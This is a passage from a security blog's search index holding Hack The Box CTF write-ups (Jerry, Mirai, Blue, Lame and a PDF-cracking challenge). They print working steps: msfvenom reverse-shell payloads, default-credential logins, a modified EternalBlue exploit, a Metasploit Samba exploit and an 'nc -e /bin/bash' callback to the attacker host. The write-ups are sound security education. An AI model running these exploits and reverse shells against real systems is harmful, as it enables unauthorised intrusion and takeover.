skills are needed to compromise this machine","time":8,"title":"Active"},{"contents":"  OS: Windows   Difficulty: Easy   IP Address: 10.10.10.95   Release: 30 / 06 / 2018   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -Pn -o nmap/targeted 10.10.10.95 -p 8080 Nmap scan report for 10.10.10.95 Host is up (0.035s latency). PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-server-header: Apache-Coyote/1.1 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/7.0.88 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.93 seconds  This machine has port 8080 (HTTP) open.\nEnumeration If we go to http://10.10.10.95:8080 we will see the default page for Tomcat web server:\nIf we try going to /manager/html (clicking in \u0026ldquo;Manager App\u0026rdquo;), we are asked for credentials:\nIf we cancel, we will see an error message that shows the default configuration file tomcat-users.xml (and the default credentials: tomcat:s3cret):\nWe can try the default credentials and we are in:\nFoothold At this point, we can craft a malicious WAR file in order to get a reverse shell on the machine. For that, we can use msfvenom as follows:\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f war -o rev.war Payload size: 1091 bytes Final size of war file: 1091 bytes Saved as: rev.war  Then we upload the WAR file. And there we have the /rev endpoint:\nIf we access it, we get the connection in nc:\n$ rlwrap ncat -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.95. Ncat: Connection from 10.10.10.95:49192. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\apache-tomcat-7.0.88\u0026gt;  Privilege escalation Surprisingly, we are already nt authority\\system, so we have already escalated privileges:\nC:\\apache-tomcat-7.0.88\u0026gt;whoami nt authority\\system  Now we can search the flags, which come together:\nC:\\apache-tomcat-7.0.88\u0026gt;dir C:\\Users Volume in drive C has no label. Volume Serial Number is 0834-6C04 Directory of C:\\Users 06/18/2018 11:31 PM \u0026lt;DIR\u0026gt; . 06/18/2018 11:31 PM \u0026lt;DIR\u0026gt; .. 06/18/2018 11:31 PM \u0026lt;DIR\u0026gt; Administrator 08/22/2013 06:39 PM \u0026lt;DIR\u0026gt; Public 0 File(s) 0 bytes 4 Dir(s) 2,407,866,368 bytes free C:\\apache-tomcat-7.0.88\u0026gt;dir C:\\Users\\Administrator\\Desktop Volume in drive C has no label. Volume Serial Number is 0834-6C04 Directory of C:\\Users\\Administrator\\Desktop 06/19/2018 07:09 AM \u0026lt;DIR\u0026gt; . 06/19/2018 07:09 AM \u0026lt;DIR\u0026gt; .. 06/19/2018 07:09 AM \u0026lt;DIR\u0026gt; flags 0 File(s) 0 bytes 3 Dir(s) 2,407,866,368 bytes free C:\\apache-tomcat-7.0.88\u0026gt;dir C:\\Users\\Administrator\\Desktop\\flags Volume in drive C has no label. Volume Serial Number is 0834-6C04 Directory of C:\\Users\\Administrator\\Desktop\\flags 06/19/2018 07:09 AM \u0026lt;DIR\u0026gt; . 06/19/2018 07:09 AM \u0026lt;DIR\u0026gt; .. 06/19/2018 07:11 AM 88 2 for the price of 1.txt 1 File(s) 88 bytes 2 Dir(s) 2,407,866,368 bytes free C:\\apache-tomcat-7.0.88\u0026gt;type \"C:\\Users\\Administrator\\Desktop\\flags\\2 for the price of 1.txt\" user.txt 7004dbcef0f854e0fb401875f26ebd00 root.txt 04a8b36e1545a455393d067e772fe90e  ","image":"/images/HTB/Jerry/Jerry.png","permalink":"https://7rocky.github.io/en/htb/jerry/","section":"htb","summary":"Hack The Box. Windows. Easy machine. This machine exposes a default page with Tomcat. We can access to the manager using default credentials and get Remote Code Execution on the machine as Administrator","time":3,"title":"Jerry"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.10.48   Release: 02 / 09 / 2017   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.48 -p 22,53,80,1700,32400,32469 Nmap scan report for 10.10.10.48 Host is up (0.067s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0) | ssh-hostkey: | 1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA) | 2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA) | 256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA) |_ 256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519) 53/tcp open domain dnsmasq 2.76 | dns-nsid: |_ bind.version: dnsmasq-2.76 80/tcp open http lighttpd 1.4.35 |_http-title: Site doesn't have a title (text/html; charset=UTF-8). |_http-server-header: lighttpd/1.4.35 1700/tcp open upnp Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50) 32400/tcp open http Plex Media Server httpd | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. |_http-favicon: Plex |_http-cors: HEAD GET POST PUT DELETE OPTIONS |_http-title: Unauthorized 32469/tcp open upnp Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 21.09 seconds  This machine has ports 22 (SSH), 80 (HTTP), 1700, 32400 and 32469 open.\nSystem enumeration If we connect to port 80 using curl, we will see some weird HTTP response headers:\n$ curl -i 10.10.10.48 HTTP/1.1 404 Not Found X-Pi-hole: A black hole for Internet advertisements. Content-type: text/html; charset=UTF-8 Content-Length: 0 Date: Fri, 15 Jul 2022 11:47:54 GMT Server: lighttpd/1.4.35  Pi-hole is a service to block given IP addresses and domains that is meant to be run in a Raspberry Pi.\nThe name of the machine (Mirai) refers to a cyber attack that consisted in a botnet that comprimised DNS servers using a DDoS attack. The botnet was formed with IoT devices, IP cameras, and other devices that had open ports with default credentials.\nFoothold on the machine Given that the machine is likely to be a Raspberry Pi device, we can try to connect via SSH with default credentials (username: pi, password: raspberry):\n$ ssh pi@10.10.10.48 pi@raspberrypi:~ $ find / -name user.txt 2\u0026gt;/dev/null /home/pi/Desktop/user.txt /lib/live/mount/persistence/sda2/home/pi/Desktop/user.txt pi@raspberrypi:~ $ cat /home/pi/Desktop/user.txt ff837707441b257a20e32199d7c8838d  And we are in.\nPrivilege escalation Let\u0026rsquo;s do a basic enumeration:\npi@raspberrypi:~ $ id uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)  We belong to group sudo, so we can spawn a shell as root:\npi@raspberrypi:~ $ sudo su root@raspberrypi:/home/pi# cd root@raspberrypi:~# cat root.txt I lost my original root.txt! I think I may have a backup on my USB stick...  But where\u0026rsquo;s the root.txt flag? Let\u0026rsquo;s go to the USB stick:\nroot@raspberrypi:~# ls -la / total 72 drwxr-xr-x 35 root root 4096 Aug 14 2017 . drwxr-xr-x 35 root root 4096 Aug 14 2017 .. drwxr-xr-x 2 root root 4096 Aug 13 2017 bin drwxr-xr-x 2 root root 4096 Aug 13 2017 boot drwxr-xr-x 17 root root 3280 Jul 15 11:42 dev drwxr-xr-x 170 root root 4096 Dec 24 2017 etc drwxr-xr-x 4 root root 4096 Aug 13 2017 home lrwxrwxrwx 1 root root 33 Dec 13 2016 initrd.img - /boot/initrd.img-3.16.0-4-686-pae lrwxrwxrwx 1 root root 29 Dec 13 2016 initrd.img.old - /boot/initrd.img-3.16.0-4-586 drwxr-xr-x 28 root root 4096 Aug 13 2017 lib drwx------ 2 root root 16384 Aug 13 2017 lost+found drwxr-xr-x 3 root root 4096 Aug 14 2017 media drwxr-xr-x 2 root root 3 Nov 2 2016 mnt drwxr-xr-x 6 root root 4096 Aug 13 2017 opt -rw-r--r-- 1 root root 8 Aug 13 2017 persistence.conf dr-xr-xr-x 127 root root 0 Jul 15 11:41 proc drwx------ 3 root root 4096 Aug 27 2017 root drwxr-xr-x 24 root root 820 Jul 15 11:56 run drwxr-xr-x 2 root root 4096 Dec 24 2017 sbin drwxr-xr-x 2 root root 3 Nov 2 2016 srv dr-xr-xr-x 13 root root 0 Jul 15 11:41 sys drwxrwxrwt 13 root root 320 Jul 15 11:43 tmp drwxr-xr-x 19 root root 4096 Aug 13 2017 usr drwxr-xr-x 17 root root 4096 Aug 13 2017 var lrwxrwxrwx 1 root root 29 Dec 13 2016 vmlinuz - boot/vmlinuz-3.16.0-4-686-pae lrwxrwxrwx 1 root root 25 Dec 13 2016 vmlinuz.old - boot/vmlinuz-3.16.0-4-586 root@raspberrypi:~# ls -la /media total 9 drwxr-xr-x 3 root root 4096 Aug 14 2017 . drwxr-xr-x 35 root root 4096 Aug 14 2017 .. drwxr-xr-x 3 root root 1024 Aug 14 2017 usbstick root@raspberrypi:~# ls -la /media/usbstick/ total 18 drwxr-xr-x 3 root root 1024 Aug 14 2017 . drwxr-xr-x 3 root root 4096 Aug 14 2017 .. -rw-r--r-- 1 root root 129 Aug 14 2017 damnit.txt drwx------ 2 root root 12288 Aug 14 2017 lost+found root@raspberrypi:~# cat /media/usbstick/damnit.txt Damnit! Sorry man I accidentally deleted your files off the USB stick. Do you know if there is any way to get them back? -James  It has been deleted. Let\u0026rsquo;s see if we can find it. These are all volumes mounted in the file system:\nroot@raspberrypi:~# df Filesystem 1K-blocks Used Available Use% Mounted on aufs 8856504 2832136 5551436 34% / tmpfs 102396 4868 97528 5% /run /dev/sda1 1354528 1354528 0 100% /lib/live/mount/persistence/sda1 /dev/loop0 1267456 1267456 0 100% /lib/live/mount/rootfs/filesystem.squashfs tmpfs 255988 0 255988 0% /lib/live/mount/overlay /dev/sda2 8856504 2832136 5551436 34% /lib/live/mount/persistence/sda2 devtmpfs 10240 0 10240 0% /dev tmpfs 255988 8 255980 1% /dev/shm tmpfs 5120 4 5116 1% /run/lock tmpfs 255988 0 255988 0% /sys/fs/cgroup tmpfs 255988 8 255980 1% /tmp /dev/sdb 8887 93 8078 2% /media/usbstick tmpfs 51200 0 51200 0% /run/user/999 tmpfs 51200 0 51200 0% /run/user/1000  Let\u0026rsquo;s do a raw copy of the /dev/sdb device (the USB stick) using dd (forensics methodology):\nroot@raspberrypi:~# dd if=/dev/sdb of=/tmp/sdb.dd 20480+0 records in 20480+0 records out 10485760 bytes (10 MB) copied, 0.0873187 s, 120 MB/s  Now we can read all printable contents using strings (even deleted files):\nroot@raspberrypi:~# strings /tmp/sdb.dd r \u0026 /media/usbstick lost+found root.txt damnit.txt r \u0026 r \u0026 /media/usbstick lost+found root.txt damnit.txt r \u0026 /media/usbstick 2]8^ lost+found root.txt damnit.txt r \u0026 3d3e483143ff12ec505d026fa13e020b Damnit! Sorry man I accidentally deleted your files off the USB stick. Do you know if there is any way to get them back? -James  And there we have the root.txt flag.\n","image":"/images/HTB/Mirai/Mirai.png","permalink":"https://7rocky.github.io/en/htb/mirai/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine is a Raspberry Pi device that is configured with default credentials, so we can access through SSH and become root because we belong to group sudo. To get the root.txt flag, we need to do a raw copy of a USB stick","time":5,"title":"Mirai"},{"contents":"  OS: Windows   Difficulty: Easy   IP Address: 10.10.10.40   Release: 28 / 07 / 2017   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.40 -p 135,139,445,49152,49153,49154,49155,49156,49157 Nmap scan report for 10.10.10.40 Host is up (0.097s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: | smb2-security-mode: | 2.1: |_ Message signing enabled but not required | smb2-time: | date: |_ start_date: |_clock-skew: mean: -19m57s, deviation: 34m36s, median: 1s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 71.62 seconds  This machine has ports 135 (MS-RPC), 139 and 445 (SMB) open, within others.\n$ crackmapexec smb 10.10.10.40 SMB 10.10.10.40 445 HARIS-PC [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)  Enumeration If we take a look at the version of SMB (SMBv1), with no signing, we know that we can perform an attack called EternalBlue (CVE-2017-0144). Also, the name of the machine (Blue) is a hint.\nWe are able to list some shares in SMB using a null session:\n$ smbclient -L 10.10.10.40 -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Share Disk Users Disk Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available  Let\u0026rsquo;s run the EternalBlue attack using MS17-010. For that, we need to use Python version 2.7. The best way is with a Docker container:\n$ docker run -v \"$(pwd):/opt\" -it python:2.7 bash root@2955c01b9358:/# cd /opt root@2955c01b9358:/opt# cd MS17-010/ root@2955c01b9358:/opt/MS17-010# ls -la total 204 drwxr-xr-x 22 root root 704 Jul 15 13:26 . drwxr-xr-x 3 root root 96 Jul 15 13:26 .. drwxr-xr-x 12 root root 384 Jul 15 13:26 .git -rw-r--r-- 1 root root 27786 Jul 15 13:26 BUG.txt -rw-r--r-- 1 root root 3367 Jul 15 13:26 README.md -rw-r--r-- 1 root root 2495 Jul 15 13:26 checker.py -rw-r--r-- 1 root root 25722 Jul 15 13:26 eternalblue_exploit7.py -rw-r--r-- 1 root root 24079 Jul 15 13:26 eternalblue_exploit8.py -rw-r--r-- 1 root root 3804 Jul 15 13:26 eternalblue_poc.py -rw-r--r-- 1 root root 1544 Jul 15 13:26 eternalchampion_leak.py -rw-r--r-- 1 root root 2591 Jul 15 13:26 eternalchampion_poc.py -rw-r--r-- 1 root root 5936 Jul 15 13:26 eternalchampion_poc2.py -rw-r--r-- 1 root root 1651 Jul 15 13:26 eternalromance_leak.py -rw-r--r-- 1 root root 948 Jul 15 13:26 eternalromance_poc.py -rw-r--r-- 1 root root 5107 Jul 15 13:26 eternalromance_poc2.py -rw-r--r-- 1 root root 1865 Jul 15 13:26 eternalsynergy_leak.py -rw-r--r-- 1 root root 3022 Jul 15 13:26 eternalsynergy_poc.py -rw-r--r-- 1 root root 1110 Jul 15 13:26 infoleak_uninit.py -rw-r--r-- 1 root root 16669 Jul 15 13:26 mysmb.py -rw-r--r-- 1 root root 1846 Jul 15 13:26 npp_control.py drwxr-xr-x 5 root root 160 Jul 15 13:26 shellcode -rw-r--r-- 1 root root 43417 Jul 15 13:26 zzz_exploit.py  Now we need to install impacket (pip install impacket). Next, we can check that the machine is vulnerable using checker.py:\nroot@2955c01b9358:/opt/MS17-010# python checker.py checker.py \u0026lt;ip\u0026gt; root@2955c01b9358:/opt/MS17-010# python checker.py 10.10.10.40 Target OS: Windows 7 Professional 7601 Service Pack 1 The target is not patched === Testing named pipes === spoolss: STATUS_ACCESS_DENIED samr: STATUS_ACCESS_DENIED netlogon: STATUS_ACCESS_DENIED lsarpc: STATUS_ACCESS_DENIED browser: STATUS_ACCESS_DENIED  It doesn\u0026rsquo;t appear to be vulnerable. But let\u0026rsquo;s use guest as the username (we need to modify the script):\nroot@2955c01b9358:/opt/MS17-010# python checker.py 10.10.10.40 Target OS: Windows 7 Professional 7601 Service Pack 1 The target is not patched === Testing named pipes === spoolss: STATUS_OBJECT_NAME_NOT_FOUND samr: Ok (64 bit) netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint)) lsarpc: Ok (64 bit) browser: Ok (64 bit)  Alright, much better.\nSMB exploitation At this moment, we can use zzz_exploit.py to compromise the machine (we need to use guest as username again):\nroot@2955c01b9358:/opt/MS17-010# python zzz_exploit.py zzz_exploit.py  Great, it worked. But it only created a file at C:\\pwned.txt. In order to get Remote Code Execution (RCE), we can expose a malicious binary file using an SMB server and run it:\n$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f exe -o pwn.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of exe file: 7168 bytes Saved as: pwn.exe  Now we need to modify a bit the exploit. Specifically, this function must be set like this:\ndefservice_exec(a, v): pass defsmb_pwn(conn, arch): #smbConn = conn.get_smbconnection() #print('creating file c:\\\\pwned.txt on the target') #tid2 = smbConn.connectTree('C$') #fid2 = smbConn.createFile(tid2, '/pwned.txt') #smbConn.closeFile(tid2, fid2) #smbConn.disconnectTree(tid2) #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py') service_exec(conn, r'cmd /c \\\\10.10.17.44\\smbFolder\\pwn.exe') # Note: there are many methods to get shell over SMB admin session # a simple method to get shell (but easily to be detected by AV) is # executing binary generated by \"msfvenom -f exe-service ...\"  Then, we start the SMB server with smbserver.py (Impacket) and run the exploit. If it does not work, we can use one of the pipes listed with checker.py (samr, lsarpc, browser\u0026hellip;):\n$ impacket-smbserver smbFolder \"$(pwd)\" Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed  root@2955c01b9358:/opt/MS17-010# python zzz_exploit.py 10.10.10.40 samr Target OS: Windows 7 Professional 7601 Service Pack 1 Target is 64 bit Got frag size: 0x10 GROOM_POOL_SIZE: 0x5030 BRIDE_TRANS_SIZE: 0xfa0 CONNECTION: 0xfffffa80038c3020 SESSION: 0xfffff8a0085478a0 FLINK: 0xfffff8a0080cc048 InParam: 0xfffff8a00872a15c MID: 0x3803 unexpected alignment, diff: 0x-65efb8 leak failed... try again CONNECTION: 0xfffffa80038c3020 SESSION: 0xfffff8a0085478a0 FLINK: 0xfffff8a0087b2088 InParam: 0xfffff8a0087a515c MID: 0x3903 unexpected alignment, diff: 0xc088 leak failed... try again CONNECTION: 0xfffffa80038c3020 SESSION: 0xfffff8a0085478a0 FLINK: 0xfffff8a0087d2088 InParam: 0xfffff8a0087cc15c MID: 0x3903 success controlling groom transaction modify trans1 struct for arbitrary read/write make this SMB session to be SYSTEM overwriting session security context Opening SVCManager on 10.10.10.40..... Creating service zVPI..... Starting service zVPI..... The NETBIOS connection with the remote host timed out. Removing service zVPI..... ServiceExec Error on: 10.10.10.40 Unexpected answer from server: Got 46, Expected 47 Done  We receive the connection in the SMB server:\n$ impacket-smbserver smbFolder \"$(pwd)\" Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed [*] Incoming connection (10.10.10.40,49197) [*] AUTHENTICATE_MESSAGE (\\,HARIS-PC) [*] User HARIS-PC\\ authenticated successfully [*] :::00::aaaaaaaaaaaaaaaa [-] Unknown level for query path info! 0x109 [-] Unknown level for query path info! 0x4 [-] Unknown level for query path info! 0x109  The binary pwn.exe is run and we get a shell as nt authority\\system:\n$ rlwrap ncat -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.40. Ncat: Connection from 10.10.10.40:49198. Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami nt authority\\system  At this point, we can read both user.txt and root.txt flags:\nC:\\Windows\\system32\u0026gt;dir C:\\Users Volume in drive C has no label. Volume Serial Number is BE92-053B Directory of C:\\Users 21/07/2017 07:56 \u0026lt;DIR\u0026gt; . 21/07/2017 07:56 \u0026lt;DIR\u0026gt; .. 21/07/2017 07:56 \u0026lt;DIR\u0026gt; Administrator 14/07/2017 14:45 \u0026lt;DIR\u0026gt; haris 12/04/2011 08:51 \u0026lt;DIR\u0026gt; Public 0 File(s) 0 bytes 5 Dir(s) 2,691,747,840 bytes free C:\\Windows\\system32\u0026gt;type C:\\Users\\haris\\Desktop\\user.txt bb50fc9a421df6dc53a95fd7a5c4bfe6 C:\\Windows\\system32\u0026gt;type C:\\Users\\Administrator\\Desktop\\root.txt fd999003d610c8fe77d56868651ba5d3  ","image":"/images/HTB/Blue/Blue.png","permalink":"https://7rocky.github.io/en/htb/blue/","section":"htb","summary":"Hack The Box. Windows. Easy machine. This machine exposes SMB version 1, which is vulnerable to EternalBlue. Once the exploit is done, we get access as Administrator","time":7,"title":"Blue"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.10.3   Release: 14 / 03 / 2017   Port scanning # Nmap 7.92 scan initiate as: nmap -sC -sV -Pn -o nmap/targeted 10.10.10.3 -p 21,22,139,445,3632 Nmap scan report for 10.10.10.3 Host is up (0.064s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.17.44 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) |_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: |_clock-skew: mean: 2h01m21s, deviation: 2h49m45s, median: 1m18s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 52.51 seconds  This machine has ports 21 (FTP), 22 (SSH), 139, 445 (SMB) and 3632 open.\nFTP enumeration As stated by nmap we can access FTP with anonymous credentials:\n$ ftp 10.10.10.3 Connected to 10.10.10.3. 220 (vsFTPd 2.3.4) Name (10.10.10.3:rocky): anonymous 331 Please specify the password. Password: 230 Login successful. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. 226 Directory send OK.  But there\u0026rsquo;s nothing inside.\nWe can search for exploits for the version of FTP service (vsFTP 2.3.4) with searchsploit:\n$ searchsploit vsftp 2.3.4 ------------------------------------------------------- ---------------------- Exploit Title | Path ------------------------------------------------------- ---------------------- vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb ------------------------------------------------------- ---------------------- Shellcodes: No Results  Alright, it seems that we can get Remote Code Execution (RCE) for this version (CVE-2011-2523). If we inspect the exploit source code, it seems that there is a backdoor for user nergal:) that opens a bind shell on port 6200. However, it is not exploitable.\nSMB enumeration Let\u0026rsquo;s search for exploits the Samba 3.0.20 in searchsploit:\n$ searchsploit Samba 3.0.20 --------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------- --------------------------------- Samba 3.0.10 \u0026lt; 3.3.5 - Format String / Security Bypass | multiple/remote/10095.txt Samba 3.0.20 \u0026lt; 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | unix/remote/16320.rb Samba \u0026lt; 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt Samba \u0026lt; 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt Samba \u0026lt; 3.6.2 (x86) - Denial of Service (PoC) | linux_x86/dos/36741.py ------------------------------------------------------------------------------------------------------------------- Shellcodes: No Results  Alright, there is one that provides RCE.\nFoothold on the machine Let\u0026rsquo;s use Metasploit for this purpose:\n# msfconsole -q msf6 \u0026gt; search Samba 3.0.20 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/samba/usermap_script 2007-05-14 excellent No Samba \"username map script\" Command Execution Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script msf6 \u0026gt; use exploit/multi/samba/usermap_script [*] No payload configured, defaulting to cmd/unix/reverse_netcat msf6 exploit(multi/samba/usermap_script) \u0026gt; show options Module options (exploit/multi/samba/usermap_script): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 139 yes The target port (TCP) Payload options (cmd/unix/reverse_netcat): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.1.100 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic msf6 exploit(multi/samba/usermap_script) \u0026gt; set RHOSTS 10.10.10.3 RHOSTS =\u0026gt; 10.10.10.3 msf6 exploit(multi/samba/usermap_script) \u0026gt; set LHOST 10.10.17.44 LHOST =\u0026gt; 10.10.17.44 msf6 exploit(multi/samba/usermap_script) \u0026gt; exploit [*] Started reverse TCP handler on 10.10.17.44:4444 [*] Command shell session 1 opened (10.10.17.44:4444 -\u0026gt; 10.10.10.3:40626) at 2022-07-17 18:24:10 +0200 which nc /bin/nc nc -e /bin/bash 10.10.17.44 5555  I decided to run a second reverse shell to get a full TTY in nc:\n$ nc -nlvp 5555 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::5555 Ncat: Listening on 0.0.0.0:5555 Ncat: Connection from 10.10.10.3. Ncat: Connection from 10.10.10.3:54564. script /dev/null -c bash root@lame:/# ^Z zsh: suspended ncat -nlvp 5555 $ stty raw -echo; fg [1] + continued ncat -nlvp 5555 Erase set to delete. Kill set to control-U (^U). Interrupt set to control-C (^C). root@lame:/# export TERM=xterm root@lame:/# export SHELL=bash root@lame:/# stty rows 50 columns 158  Privilege escalation We are already root, so at this point, we must capture both flags:\nroot@lame:/# ls /home ftp makis service user root@lame:/# find /home -name user.txt /home/makis/user.txt root@lame:/# cat /home/makis/user.txt 56c5a638db443c0dd212990228c55aec root@lame:/# cat /root/root.txt 490c7ed2a8c6e7a72d719d478938accc  ","image":"/images/HTB/Lame/Lame.png","permalink":"https://7rocky.github.io/en/htb/lame/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine exposes vulnerable versions for FTP and SMB services. The SMB service is exploitable and derives in RCE as root","time":4,"title":"Lame"},{"contents":"We are given a PDF file called 0ld is g0ld.pdf, but it is protected with a password.\nIn order to obtain the password, we can use pdf2john to extract a hash and pass it to john to perform a dictionary attack using rockyou.txt:\n$ pdf2john 0ld\\ is\\ g0ld.pdf | tee hash 0ld is g0ld.pdf:$pdf$4*4*128*-1060*1*16*5c8f37d2a45eb64e9dbbf71ca3e86861*32*9cba5cfb1c536f1384bba7458aae3f8100000000000000000000000000000000*32*702cc7ced92b595274b7918dcb6dc74bedef6ef851b4b4b5b8c88732ba4dac0c $ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64]) Cost 1 (revision) is 4 for all loaded hashes Press 'q' or Ctrl-C to abort, almost any other key for status jumanji69 (0ld is g0ld.pdf) 1g 0:00:01:28 DONE 0.01126g/s 76825p/s 76825c/s 76825C/s jumapi..jumanee Use the \"--show --format=PDF\" options to display all of the cracked passwords reliably Session completed.  So we got the password (jumanji69). If we open now the PDF file, we will see a portrait for Samuel Morse:\nAnd if we zoom a bit, we will see a stream of . and - (that\u0026rsquo;s Morse code):\nWe can take this string and decode it:\nSo the flag is: HTB{R1PSAMU3LM0RS3}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/misc/0ld-is-g0ld/","section":"ctf","summary":"Crack PDF file hash. Morse code","time":1,"title":"0ld is g0ld"},{"contents":"We are given this set of numbers and 